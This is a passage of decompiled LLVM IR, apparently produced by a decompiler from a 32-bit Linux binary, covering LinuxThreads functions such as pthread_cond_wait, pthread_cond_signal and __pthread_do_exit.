  uselistorder i32 %v2_805a18b, { 11, 10, 12, 5, 6, 7, 2, 1, 8, 9, 4, 13, 3, 14, 15, 16, 17, 0 }
  uselistorder i32 %v4_805a187, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 2, 3, 4, 1, 5, 0 }
  uselistorder i32* %stack_var_-60, { 4, 5, 2, 6, 7, 1, 8, 3, 9, 10, 0, 11 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805a32c, { 1, 0 }
  uselistorder label %dec_label_pc_805a329, { 1, 0 }
  uselistorder label %dec_label_pc_805a30f, { 1, 0 }
  uselistorder label %dec_label_pc_805a2f4, { 1, 0 }
  uselistorder label %dec_label_pc_805a2e8, { 1, 0 }
  uselistorder label %dec_label_pc_805a318.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805a289, { 1, 0 }
  uselistorder label %dec_label_pc_805a210, { 1, 0 }
}

define i32 @__GI_pthread_cond_wait(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805a339 = load i32, i32* @edi, align 4
  %v0_805a33a = load i32, i32* @esi, align 4
  %v0_805a33b = load i32, i32* @ebx, align 4
  store i32 %v0_805a33b, i32* %stack_var_-16, align 4
  %v4_805a33b = ptrtoint i32* %stack_var_-16 to i32
  %v2_805a33f = call i32 @thread_self.13(i32 %v0_805a33b, i32 %v0_805a33a)
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_805a34d = add i32 %arg2, 12
  %v2_805a34d = inttoptr i32 %v1_805a34d to i32*
  %v3_805a34d = load i32, i32* %v2_805a34d, align 4
  %v9_805a350 = icmp eq i32 %v3_805a34d, 3
  br i1 %v9_805a350, label %dec_label_pc_805a36a, label %dec_label_pc_805a355

dec_label_pc_805a355:                             ; preds = %entry
  %v1_805a355 = icmp eq i32 %v3_805a34d, 0
  br i1 %v1_805a355, label %dec_label_pc_805a36a, label %dec_label_pc_805a359

dec_label_pc_805a359:                             ; preds = %dec_label_pc_805a355
  %v1_805a361 = add i32 %arg2, 8
  %v2_805a361 = inttoptr i32 %v1_805a361 to i32*
  %v3_805a361 = load i32, i32* %v2_805a361, align 4
  %v15_805a361 = icmp eq i32 %v3_805a361, %v2_805a33f
  %v1_805a364 = icmp eq i1 %v15_805a361, false
  br i1 %v1_805a364, label %dec_label_pc_805a46a, label %dec_label_pc_805a36a

dec_label_pc_805a36a:                             ; preds = %dec_label_pc_805a359, %dec_label_pc_805a355, %entry
  %v2_805a36d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_805a36d, i32* @edx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v1_805a37a = add i32 %v2_805a33f, 441
  %v2_805a37a = inttoptr i32 %v1_805a37a to i8*
  store i8 0, i8* %v2_805a37a, align 1
  store i32 %v2_805a33f, i32* @eax, align 4
  %v0_805a384 = load i32, i32* %stack_var_-28, align 4
  %v2_805a384 = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_805a384, i32 134586683)
  store i32 %v2_805a33f, i32* @edx, align 4
  %v0_805a38c = load i32, i32* @esi, align 4
  store i32 %v0_805a38c, i32* @eax, align 4
  %v1_805a38e = call i32 @__pthread_lock(i32 134586683)
  %v1_805a396 = add i32 %v2_805a33f, 66
  %v2_805a396 = inttoptr i32 %v1_805a396 to i8*
  %v3_805a396 = load i8, i8* %v2_805a396, align 1
  %v4_805a396 = icmp eq i8 %v3_805a396, 0
  br i1 %v4_805a396, label %dec_label_pc_805a3aa, label %dec_label_pc_805a39c

dec_label_pc_805a39c:                             ; preds = %dec_label_pc_805a36a
  store i32 1, i32* @ebx, align 4
  %v1_805a3a4 = add i32 %v2_805a33f, 64
  %v2_805a3a4 = inttoptr i32 %v1_805a3a4 to i8*
  %v3_805a3a4 = load i8, i8* %v2_805a3a4, align 1
  %v4_805a3a4 = icmp eq i8 %v3_805a3a4, 0
  br i1 %v4_805a3a4, label %dec_label_pc_805a3b7, label %dec_label_pc_805a3aa

dec_label_pc_805a3aa:                             ; preds = %dec_label_pc_805a39c, %dec_label_pc_805a36a
  store i32 %v2_805a33f, i32* @edx, align 4
  %v0_805a3b2 = call i32 @enqueue.9()
  br label %dec_label_pc_805a3b7

dec_label_pc_805a3b7:                             ; preds = %dec_label_pc_805a39c, %dec_label_pc_805a3aa
  %v0_805a3ba = load i32, i32* @esi, align 4
  store i32 %v0_805a3ba, i32* %stack_var_-60, align 4
  %v1_805a3bb = inttoptr i32 %v0_805a3ba to i32*
  %v2_805a3bb = call i32 @__pthread_unlock(i32* %v1_805a3bb)
  %v0_805a3c3 = load i32, i32* @ebx, align 4
  %v1_805a3c3 = icmp eq i32 %v0_805a3c3, 0
  br i1 %v1_805a3c3, label %dec_label_pc_805a3d5, label %dec_label_pc_805a3c7

dec_label_pc_805a3c7:                             ; preds = %dec_label_pc_805a3b7
  store i32 %v2_805a33f, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_805a3cc = load i32, i32* %stack_var_-60, align 4
  %v1_805a3cc = load i32, i32* %stack_var_-56, align 4
  %v2_805a3cc = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_805a3cc, i32 %v1_805a3cc)
  br label %dec_label_pc_805a443

dec_label_pc_805a3d5:                             ; preds = %dec_label_pc_805a3b7
  store i32 0, i32* @ebx, align 4
  %v0_805a3da = load i32, i32* @edi, align 4
  store i32 %v0_805a3da, i32* %stack_var_-60, align 4
  %v1_805a3db = call i32 @pthread_mutex_unlock(i32 %v0_805a3da)
  %v1_805a3fa = add i32 %v2_805a33f, 440
  %v2_805a3fa = inttoptr i32 %v1_805a3fa to i8*
  %v1_805a406 = add i32 %v2_805a33f, 64
  %v2_805a406 = inttoptr i32 %v1_805a406 to i8*
  store i32 %v2_805a33f, i32* @eax, align 4
  %v0_805a3e618 = call i32 @suspend.14()
  %v3_805a3ee19 = load i8, i8* %v2_805a37a, align 1
  %v4_805a3ee20 = icmp eq i8 %v3_805a3ee19, 0
  %v1_805a3f522 = icmp eq i1 %v4_805a3ee20, false
  br i1 %v1_805a3f522, label %dec_label_pc_805a40f, label %dec_label_pc_805a3f7

dec_label_pc_805a3f7:                             ; preds = %dec_label_pc_805a3d5, %dec_label_pc_805a40c
  %v3_805a3fa = load i8, i8* %v2_805a3fa, align 1
  %v4_805a3fa = icmp eq i8 %v3_805a3fa, 0
  br i1 %v4_805a3fa, label %dec_label_pc_805a40c, label %dec_label_pc_805a403

dec_label_pc_805a403:                             ; preds = %dec_label_pc_805a3f7
  %v3_805a406 = load i8, i8* %v2_805a406, align 1
  %v4_805a406 = icmp eq i8 %v3_805a406, 0
  br i1 %v4_805a406, label %dec_label_pc_805a40f, label %dec_label_pc_805a40c

dec_label_pc_805a40c:                             ; preds = %dec_label_pc_805a403, %dec_label_pc_805a3f7
  %v0_805a40c = load i32, i32* @ebx, align 4
  %v1_805a40c = add i32 %v0_805a40c, 1
  store i32 %v1_805a40c, i32* @ebx, align 4
  store i32 %v2_805a33f, i32* @eax, align 4
  %v0_805a3e6 = call i32 @suspend.14()
  %v3_805a3ee = load i8, i8* %v2_805a37a, align 1
  %v4_805a3ee = icmp eq i8 %v3_805a3ee, 0
  %v1_805a3f5 = icmp eq i1 %v4_805a3ee, false
  br i1 %v1_805a3f5, label %dec_label_pc_805a40f, label %dec_label_pc_805a3f7

dec_label_pc_805a40f:                             ; preds = %dec_label_pc_805a40c, %dec_label_pc_805a403, %dec_label_pc_805a3d5
  store i32 %v2_805a33f, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_805a414 = load i32, i32* %stack_var_-60, align 4
  %v1_805a414 = load i32, i32* %stack_var_-56, align 4
  %v2_805a414 = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_805a414, i32 %v1_805a414)
  %v3_805a41c = load i8, i8* %v2_805a3fa, align 1
  %v4_805a41c = icmp eq i8 %v3_805a41c, 0
  br i1 %v4_805a41c, label %dec_label_pc_805a456, label %dec_label_pc_805a425

dec_label_pc_805a425:                             ; preds = %dec_label_pc_805a40f
  %v3_805a428 = load i8, i8* %v2_805a406, align 1
  %v4_805a428 = icmp eq i8 %v3_805a428, 0
  %v1_805a42c = icmp eq i1 %v4_805a428, false
  br i1 %v1_805a42c, label %dec_label_pc_805a456, label %dec_label_pc_805a42e

dec_label_pc_805a42e:                             ; preds = %dec_label_pc_805a425
  store i8 0, i8* %v2_805a3fa, align 1
  %v0_805a43b = load i32, i32* @edi, align 4
  store i32 %v0_805a43b, i32* %stack_var_-60, align 4
  %v1_805a43c = call i32 @pthread_mutex_lock(i32 %v0_805a43b)
  store i32 %v0_805a43b, i32* @ebx, align 4
  %v2_805a442 = load i32, i32* %stack_var_-56, align 4
  store i32 %v2_805a442, i32* @esi, align 4
  br label %dec_label_pc_805a443

dec_label_pc_805a443:                             ; preds = %dec_label_pc_805a3c7, %dec_label_pc_805a42e
  store i32 %v4_805a33b, i32* %stack_var_-56, align 4
  store i32 -1, i32* %stack_var_-60, align 4
  %v2_805a449 = call i32 @__pthread_do_exit(i32 -1, i32 %v4_805a33b)
  br label %dec_label_pc_805a44e

dec_label_pc_805a44e:                             ; preds = %dec_label_pc_805a456, %dec_label_pc_805a443
  store i32 %v2_805a33f, i32* @eax, align 4
  %v0_805a451 = call i32 @restart.12()
  br label %dec_label_pc_805a456

dec_label_pc_805a456:                             ; preds = %dec_label_pc_805a425, %dec_label_pc_805a40f, %dec_label_pc_805a44e
  %v0_805a456 = load i32, i32* @ebx, align 4
  %v1_805a456 = add i32 %v0_805a456, -1
  store i32 %v1_805a456, i32* @ebx, align 4
  %v10_805a457 = icmp eq i32 %v0_805a456, 0
  %v1_805a45a = icmp eq i1 %v10_805a457, false
  br i1 %v1_805a45a, label %dec_label_pc_805a44e, label %dec_label_pc_805a45c

dec_label_pc_805a45c:                             ; preds = %dec_label_pc_805a456
  %v0_805a45f = load i32, i32* @edi, align 4
  %v1_805a460 = call i32 @pthread_mutex_lock(i32 %v0_805a45f)
  br label %dec_label_pc_805a46a

dec_label_pc_805a46a:                             ; preds = %dec_label_pc_805a359, %dec_label_pc_805a45c
  %v0_805a46d = phi i32 [ 22, %dec_label_pc_805a359 ], [ 0, %dec_label_pc_805a45c ]
  %v2_805a46f = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805a46f, i32* @ebx, align 4
  store i32 %v0_805a33a, i32* @esi, align 4
  store i32 %v0_805a339, i32* @edi, align 4
  ret i32 %v0_805a46d

; uselistorder directives
  uselistorder i8* %v2_805a37a, { 1, 0, 2 }
  uselistorder i32 %v3_805a34d, { 1, 0 }
  uselistorder i32 %v2_805a33f, { 6, 7, 8, 1, 4, 5, 3, 9, 2, 10, 12, 11, 13, 0 }
  uselistorder i32 %v4_805a33b, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-56, { 2, 3, 1, 0 }
  uselistorder i32* %stack_var_-60, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32 ()* @suspend.14, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if.11, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder i32 134586683, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805a46a, { 1, 0 }
  uselistorder label %dec_label_pc_805a456, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805a443, { 1, 0 }
  uselistorder label %dec_label_pc_805a3f7, { 1, 0 }
  uselistorder label %dec_label_pc_805a3b7, { 1, 0 }
}

define i32 @pthread_cond_signal(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @edx, align 4
  %v0_805a477 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_805a481 = call i32 @__pthread_lock(i32 %v0_805a477)
  %v0_805a486 = load i32, i32* @esi, align 4
  %v1_805a486 = add i32 %v0_805a486, 8
  %v2_805a486 = inttoptr i32 %v1_805a486 to i32*
  %v3_805a486 = load i32, i32* %v2_805a486, align 4
  store i32 %v3_805a486, i32* @ebx, align 4
  %v1_805a489 = icmp eq i32 %v3_805a486, 0
  br i1 %v1_805a489, label %dec_label_pc_805a49a, label %dec_label_pc_805a48d

dec_label_pc_805a48d:                             ; preds = %entry
  %v1_805a48d = add i32 %v3_805a486, 8
  %v2_805a48d = inttoptr i32 %v1_805a48d to i32*
  %v3_805a48d = load i32, i32* %v2_805a48d, align 4
  store i32 %v3_805a48d, i32* %v2_805a486, align 4
  store i32 0, i32* %v2_805a48d, align 4
  %v0_805a49d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805a49a

dec_label_pc_805a49a:                             ; preds = %entry, %dec_label_pc_805a48d
  %v0_805a49d = phi i32 [ %v0_805a486, %entry ], [ %v0_805a49d.pre, %dec_label_pc_805a48d ]
  %v1_805a49e = inttoptr i32 %v0_805a49d to i32*
  %v2_805a49e = call i32 @__pthread_unlock(i32* %v1_805a49e)
  br i1 %v1_805a489, label %dec_label_pc_805a4b8, label %dec_label_pc_805a4aa

dec_label_pc_805a4aa:                             ; preds = %dec_label_pc_805a49a
  %v1_805a4aa = add i32 %v3_805a486, 441
  %v2_805a4aa = inttoptr i32 %v1_805a4aa to i8*
  store i8 1, i8* %v2_805a4aa, align 1
  store i32 %v3_805a486, i32* @eax, align 4
  %v0_805a4b3 = call i32 @restart.12()
  br label %dec_label_pc_805a4b8

dec_label_pc_805a4b8:                             ; preds = %dec_label_pc_805a49a, %dec_label_pc_805a4aa
  ret i32 0

; uselistorder directives
  uselistorder i1 %v1_805a489, { 1, 0 }
  uselistorder i32 %v3_805a486, { 2, 0, 1, 3, 4 }
  uselistorder i32 ()* @restart.12, { 3, 0, 2, 1 }
  uselistorder i32 441, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805a4b8, { 1, 0 }
  uselistorder label %dec_label_pc_805a49a, { 1, 0 }
}

define i32 @__linuxthreads_create_event() local_unnamed_addr {
entry:
  %v0_805a4c0 = load i32, i32* @eax, align 4
  ret i32 %v0_805a4c0
}

define i32 @__linuxthreads_death_event() local_unnamed_addr {
entry:
  %v0_805a4c1 = load i32, i32* @eax, align 4
  ret i32 %v0_805a4c1
}

define i32 @__linuxthreads_reap_event() local_unnamed_addr {
entry:
  %v0_805a4c2 = load i32, i32* @eax, align 4
  ret i32 %v0_805a4c2
}

define i32 @__pthread_set_own_extricate_if.15() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_805a4c4 = load i32, i32* @esi, align 4
  %v0_805a4c5 = load i32, i32* @edx, align 4
  store i32 %v0_805a4c5, i32* @esi, align 4
  %v0_805a4c7 = load i32, i32* @ebx, align 4
  %v0_805a4c8 = load i32, i32* @eax, align 4
  store i32 %v0_805a4c8, i32* @ebx, align 4
  %v1_805a4cd = icmp eq i32 %v0_805a4c5, 0
  br i1 %v1_805a4cd, label %dec_label_pc_805a4d9, label %dec_label_pc_805a4d1

dec_label_pc_805a4d1:                             ; preds = %entry
  %v1_805a4d1 = add i32 %v0_805a4c8, 64
  %v2_805a4d1 = inttoptr i32 %v1_805a4d1 to i8*
  %v3_805a4d1 = load i8, i8* %v2_805a4d1, align 1
  %v4_805a4d1 = icmp eq i8 %v3_805a4d1, 0
  %v1_805a4d5 = icmp eq i1 %v4_805a4d1, false
  br i1 %v1_805a4d5, label %dec_label_pc_805a4fb, label %dec_label_pc_805a4e3

dec_label_pc_805a4d9:                             ; preds = %entry
  %v1_805a4d9 = add i32 %v0_805a4c8, 28
  %v2_805a4d9 = inttoptr i32 %v1_805a4d9 to i32*
  %v3_805a4d9 = load i32, i32* %v2_805a4d9, align 4
  store i32 %v3_805a4d9, i32* @eax, align 4
  store i32 %v0_805a4c8, i32* @edx, align 4
  %v1_805a4de = call i32 @__pthread_lock(i32 %v0_805a4c7)
  %v1_805a4e5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805a4e3

dec_label_pc_805a4e3:                             ; preds = %dec_label_pc_805a4d1, %dec_label_pc_805a4d9
  %v1_805a4e5 = phi i32 [ %v0_805a4c8, %dec_label_pc_805a4d1 ], [ %v1_805a4e5.pre, %dec_label_pc_805a4d9 ]
  %v2_805a4e5 = add i32 %v1_805a4e5, 444
  %v3_805a4e5 = inttoptr i32 %v2_805a4e5 to i32*
  store i32 %v0_805a4c5, i32* %v3_805a4e5, align 4
  %v1_805a4eb = icmp eq i1 %v1_805a4cd, false
  br i1 %v1_805a4eb, label %dec_label_pc_805a4fb, label %dec_label_pc_805a4ed

dec_label_pc_805a4ed:                             ; preds = %dec_label_pc_805a4e3
  %v0_805a4f0 = load i32, i32* @ebx, align 4
  %v1_805a4f0 = add i32 %v0_805a4f0, 28
  %v2_805a4f0 = inttoptr i32 %v1_805a4f0 to i32*
  %v3_805a4f0 = load i32, i32* %v2_805a4f0, align 4
  %v1_805a4f3 = inttoptr i32 %v3_805a4f0 to i32*
  %v2_805a4f3 = call i32 @__pthread_unlock(i32* %v1_805a4f3)
  br label %dec_label_pc_805a4fb

dec_label_pc_805a4fb:                             ; preds = %dec_label_pc_805a4e3, %dec_label_pc_805a4d1, %dec_label_pc_805a4ed
  %v2_805a4fb = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_805a4c7, i32* @ebx, align 4
  store i32 %v0_805a4c4, i32* @esi, align 4
  ret i32 %v2_805a4fb

; uselistorder directives
  uselistorder i32 %v0_805a4c5, { 1, 0, 2 }
  uselistorder i32 444, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_805a4fb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805a4e3, { 1, 0 }
}

define i32 @thread_self.16(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_805a4ff = load i32, i32* @esp, align 4
  %v1_805a4ff = load i32, i32* @global_var_8079c4c.565, align 4
  %v7_805a4ff = icmp ult i32 %v0_805a4ff, %v1_805a4ff
  %v1_805a50c = icmp eq i1 %v7_805a4ff, false
  br i1 %v1_805a50c, label %dec_label_pc_805a53d, label %dec_label_pc_805a50e

dec_label_pc_805a50e:                             ; preds = %entry
  %v1_805a50e = load i32, i32* @global_var_8079c50.566, align 16
  %v7_805a50e = icmp ult i32 %v0_805a4ff, %v1_805a50e
  br i1 %v7_805a50e, label %dec_label_pc_805a523, label %dec_label_pc_805a516

dec_label_pc_805a516:                             ; preds = %dec_label_pc_805a50e
  %v1_805a516 = load i32, i32* @global_var_8079c54.567, align 4
  %v7_805a516 = icmp ult i32 %v0_805a4ff, %v1_805a516
  br i1 %v7_805a516, label %dec_label_pc_805a53d, label %dec_label_pc_805a523

dec_label_pc_805a523:                             ; preds = %dec_label_pc_805a516, %dec_label_pc_805a50e
  %v0_805a523 = load i32, i32* @global_var_807f358.569, align 8
  %v1_805a523 = icmp eq i32 %v0_805a523, 0
  br i1 %v1_805a523, label %dec_label_pc_805a531, label %dec_label_pc_805a52c

dec_label_pc_805a52c:                             ; preds = %dec_label_pc_805a523
  %v0_805a52c = call i32 @__pthread_find_self()
  br label %dec_label_pc_805a531

dec_label_pc_805a531:                             ; preds = %dec_label_pc_805a523, %dec_label_pc_805a52c
  %v2_805a537 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_805a53d

dec_label_pc_805a53d:                             ; preds = %dec_label_pc_805a516, %entry, %dec_label_pc_805a531
  %v0_805a53d = phi i32 [ ptrtoint (i32* @global_var_8075120.568 to i32), %dec_label_pc_805a516 ], [ ptrtoint (i32* @global_var_8074f40 to i32), %entry ], [ %v2_805a537, %dec_label_pc_805a531 ]
  ret i32 %v0_805a53d

; uselistorder directives
  uselistorder label %dec_label_pc_805a53d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805a531, { 1, 0 }
}

define i32 @join_extricate_func(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805a53e = load i32, i32* @esi, align 4
  %v0_805a53f = load i32, i32* @ebx, align 4
  %v2_805a543 = call i32 @thread_self.16(i32 %v0_805a53f, i32 %v0_805a53e)
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %v2_805a543, i32* @edx, align 4
  %v1_805a556 = call i32 @__pthread_lock(i32 %v2_805a543)
  %v0_805a55b = load i32, i32* @ebx, align 4
  %v1_805a55b = add i32 %v0_805a55b, 8
  %v2_805a55b = inttoptr i32 %v1_805a55b to i32*
  %v3_805a55b = load i32, i32* %v2_805a55b, align 4
  %v1_805a55e = add i32 %v3_805a55b, 56
  %v2_805a55e = inttoptr i32 %v1_805a55e to i32*
  %v3_805a55e = load i32, i32* %v2_805a55e, align 4
  %v4_805a55e = icmp eq i32 %v3_805a55e, 0
  store i32 0, i32* %v2_805a55e, align 4
  %v1_805a569 = icmp eq i1 %v4_805a55e, false
  %v2_805a569 = zext i1 %v1_805a569 to i32
  %v0_805a56f = load i32, i32* @ebx, align 4
  store i32 %v2_805a569, i32* @esi, align 4
  %v1_805a573 = inttoptr i32 %v0_805a56f to i32*
  %v2_805a573 = call i32 @__pthread_unlock(i32* %v1_805a573)
  %v0_805a57b = load i32, i32* @esi, align 4
  ret i32 %v0_805a57b

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @suspend.17() local_unnamed_addr {
entry:
  %v0_805a583 = load i32, i32* @eax, align 4
  %v1_805a584 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_805a583)
  ret i32 %v1_805a584

; uselistorder directives
  uselistorder i32 (i32)* @__pthread_wait_for_restart_signal, { 1, 2, 3, 4, 0, 5, 6 }
}

define i32 @__pthread_do_exit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %v0_805a58d = load i32, i32* @esi, align 4
  %v0_805a58e = load i32, i32* @ebx, align 4
  %v2_805a595 = call i32 @thread_self.16(i32 %v0_805a58e, i32 %v0_805a58d)
  %v1_805a59d = add i32 %v2_805a595, 64
  %v2_805a59d = inttoptr i32 %v1_805a59d to i8*
  store i8 1, i8* %v2_805a59d, align 1
  store i32 %v2_805a595, i32* @ebx, align 4
  %v1_805a5a3 = add i32 %v2_805a595, 65
  %v2_805a5a3 = inttoptr i32 %v1_805a5a3 to i8*
  store i8 0, i8* %v2_805a5a3, align 1
  store i32 %arg2, i32* %stack_var_-188, align 4
  %v1_805a5ae = call i32 @__pthread_perform_cleanup(i32 %arg2)
  %v0_805a5b3 = call i32 @__pthread_destroy_specifics()
  %v0_805a5b8 = load i32, i32* @ebx, align 4
  %v1_805a5b8 = add i32 %v0_805a5b8, 28
  %v2_805a5b8 = inttoptr i32 %v1_805a5b8 to i32*
  %v3_805a5b8 = load i32, i32* %v2_805a5b8, align 4
  store i32 %v3_805a5b8, i32* @eax, align 4
  store i32 %v0_805a5b8, i32* @edx, align 4
  %v0_805a5bd = load i32, i32* %stack_var_-188, align 4
  %v1_805a5bd = call i32 @__pthread_lock(i32 %v0_805a5bd)
  %v0_805a5cc = load i32, i32* @ebx, align 4
  %v1_805a5cc = add i32 %v0_805a5cc, 412
  %v2_805a5cc = inttoptr i32 %v1_805a5cc to i32*
  %v3_805a5cc = load i32, i32* %v2_805a5cc, align 4
  %v4_805a5cc = icmp eq i32 %v3_805a5cc, 0
  %v2_805a5d3 = add i32 %v0_805a5cc, 48
  %v3_805a5d3 = inttoptr i32 %v2_805a5d3 to i32*
  store i32 %arg1, i32* %v3_805a5d3, align 4
  br i1 %v4_805a5cc, label %dec_label_pc_805a603, label %dec_label_pc_805a5d8

dec_label_pc_805a5d8:                             ; preds = %entry
  %v0_805a5d8 = load i32, i32* @global_var_807f35c.580, align 4
  %v1_805a5dd = load i32, i32* @ebx, align 4
  %v2_805a5dd = add i32 %v1_805a5dd, 416
  %v3_805a5dd = inttoptr i32 %v2_805a5dd to i32*
  %v4_805a5dd = load i32, i32* %v3_805a5dd, align 4
  %v5_805a5dd = or i32 %v4_805a5dd, %v0_805a5d8
  store i32 %v5_805a5dd, i32* @eax, align 4
  %v3_805a5e3 = and i32 %v5_805a5dd, 256
  %v4_805a5e3 = icmp eq i32 %v3_805a5e3, 0
  br i1 %v4_805a5e3, label %dec_label_pc_805a603, label %dec_label_pc_805a5e8

dec_label_pc_805a5e8:                             ; preds = %dec_label_pc_805a5d8
  %v1_805a5e8 = add i32 %v1_805a5dd, 424
  %v2_805a5e8 = inttoptr i32 %v1_805a5e8 to i32*
  store i32 9, i32* %v2_805a5e8, align 4
  %v0_805a5f2 = load i32, i32* @ebx, align 4
  %v2_805a5f2 = add i32 %v0_805a5f2, 428
  %v3_805a5f2 = inttoptr i32 %v2_805a5f2 to i32*
  store i32 %v0_805a5f2, i32* %v3_805a5f2, align 4
  %v0_805a5f8 = load i32, i32* @ebx, align 4
  store i32 %v0_805a5f8, i32* @global_var_807f364.581, align 4
  %v0_805a5fe = call i32 @__linuxthreads_death_event()
  br label %dec_label_pc_805a603

dec_label_pc_805a603:                             ; preds = %dec_label_pc_805a5d8, %entry, %dec_label_pc_805a5e8
  %v0_805a606 = load i32, i32* @ebx, align 4
  %v1_805a606 = add i32 %v0_805a606, 56
  %v2_805a606 = inttoptr i32 %v1_805a606 to i32*
  %v3_805a606 = load i32, i32* %v2_805a606, align 4
  %v1_805a609 = add i32 %v0_805a606, 44
  %v2_805a609 = inttoptr i32 %v1_805a609 to i8*
  store i8 1, i8* %v2_805a609, align 1
  %v0_805a60d = load i32, i32* @ebx, align 4
  %v1_805a60d = add i32 %v0_805a60d, 28
  %v2_805a60d = inttoptr i32 %v1_805a60d to i32*
  %v3_805a60d = load i32, i32* %v2_805a60d, align 4
  store i32 %v3_805a60d, i32* %stack_var_-188, align 4
  %v1_805a610 = inttoptr i32 %v3_805a60d to i32*
  %v2_805a610 = call i32 @__pthread_unlock(i32* %v1_805a610)
  %v1_805a618 = icmp eq i32 %v3_805a606, 0
  br i1 %v1_805a618, label %dec_label_pc_805a628, label %dec_label_pc_805a61c

dec_label_pc_805a61c:                             ; preds = %dec_label_pc_805a603
  store i32 %v3_805a606, i32* %stack_var_-188, align 4
  %v1_805a620 = call i32 @__pthread_restart_new(i32 %v3_805a606)
  br label %dec_label_pc_805a628

dec_label_pc_805a628:                             ; preds = %dec_label_pc_805a603, %dec_label_pc_805a61c
  %v0_805a628 = load i32, i32* bitcast (i32** @global_var_8075300.575 to i32*), align 256
  store i32 %v0_805a628, i32* @esi, align 4
  %v0_805a62e = load i32, i32* @ebx, align 4
  %v12_805a62e = icmp eq i32 %v0_805a62e, %v0_805a628
  %v1_805a630 = icmp eq i1 %v12_805a62e, false
  br i1 %v1_805a630, label %dec_label_pc_805a67e, label %dec_label_pc_805a632

dec_label_pc_805a632:                             ; preds = %dec_label_pc_805a628
  %v0_805a632 = load i32, i32* @global_var_8075304.574, align 4
  %v2_805a632 = icmp slt i32 %v0_805a632, 0
  br i1 %v2_805a632, label %dec_label_pc_805a67e, label %dec_label_pc_805a63b

dec_label_pc_805a63b:                             ; preds = %dec_label_pc_805a632
  store i32 %v0_805a628, i32* %stack_var_-156, align 4
  %v2_805a647 = ptrtoint i32* %stack_var_-156 to i32
  br label %dec_label_pc_805a647

dec_label_pc_805a647:                             ; preds = %dec_label_pc_805a663.dec_label_pc_805a647_crit_edge, %dec_label_pc_805a63b
  %v0_805a652 = phi i32 [ %v0_805a652.pre, %dec_label_pc_805a663.dec_label_pc_805a647_crit_edge ], [ %v0_805a632, %dec_label_pc_805a63b ]
  store i32 %v0_805a652, i32* %stack_var_-188, align 4
  %v3_805a658 = call i32 @__libc_write(i32 %v0_805a652, i32 %v2_805a647, i32 148)
  %v8_805a660 = icmp eq i32 %v3_805a658, -1
  %v1_805a661 = icmp eq i1 %v8_805a660, false
  br i1 %v1_805a661, label %dec_label_pc_805a66d, label %dec_label_pc_805a663

dec_label_pc_805a663:                             ; preds = %dec_label_pc_805a647
  %v0_805a663 = load i32, i32* %stack_var_-188, align 4
  %v1_805a663 = call i32 @__errno_location(i32 %v0_805a663)
  %v1_805a668 = inttoptr i32 %v1_805a663 to i32*
  %v2_805a668 = load i32, i32* %v1_805a668, align 4
  %v11_805a668 = icmp eq i32 %v2_805a668, 4
  br i1 %v11_805a668, label %dec_label_pc_805a663.dec_label_pc_805a647_crit_edge, label %dec_label_pc_805a66d

dec_label_pc_805a663.dec_label_pc_805a647_crit_edge: ; preds = %dec_label_pc_805a663
  %v0_805a652.pre = load i32, i32* @global_var_8075304.574, align 4
  br label %dec_label_pc_805a647

dec_label_pc_805a66d:                             ; preds = %dec_label_pc_805a663, %dec_label_pc_805a647
  %v0_805a66d = load i32, i32* @esi, align 4
  store i32 %v0_805a66d, i32* @eax, align 4
  %v0_805a66f = call i32 @suspend.17()
  store i32 0, i32* %stack_var_-188, align 4
  %v1_805a679 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_805a67e

dec_label_pc_805a67e:                             ; preds = %dec_label_pc_805a632, %dec_label_pc_805a628, %dec_label_pc_805a66d
  store i32 0, i32* %stack_var_-188, align 4
  %v1_805a683 = call i32 @__GI__exit(i32 0)
  unreachable

; uselistorder directives
  uselistorder i32 %v0_805a652, { 1, 0 }
  uselistorder i32 %v0_805a628, { 1, 0, 2 }
